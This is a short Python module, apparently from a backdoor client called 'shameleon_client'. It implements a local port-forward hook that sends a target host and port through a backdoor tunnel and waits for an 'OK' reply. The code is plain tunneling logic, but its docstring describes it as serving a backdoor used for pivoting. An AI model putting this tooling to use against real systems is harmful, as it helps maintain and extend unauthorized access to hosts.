import asyncio

from shameleon_client.providers.base import ShameleonProvider


async def lfoward_connection_hook(
        remote_host: str,
        remote_port: int,
        tunnel_id: str,
        provider: ShameleonProvider,
) -> bool:
    """ Handle a local forward connection

    This function is used to handle a local forward connection. It will send the remote host and port to the backdoor
    and wait for the response.

    Args:
        remote_host (str): remote host
        remote_port (int): remote port
        tunnel_id (str): backdoor tunnel id
        provider (ShameleonProvider): backdoor provider

    Returns:
        bool: True if the connection is successful, False otherwise
    """
    payload = remote_host + '!' + str(remote_port)
    provider.send_data(tunnel_id, payload.encode('utf-8'))
    while True:  # Implement Timeout
        data = provider.receive_data(tunnel_id)
        if len(data) > 0:
            if data.decode('utf-8') != 'OK':
                print('[!] Connection failed')
                return False
            else:
                return True
        await asyncio.sleep(0.1)
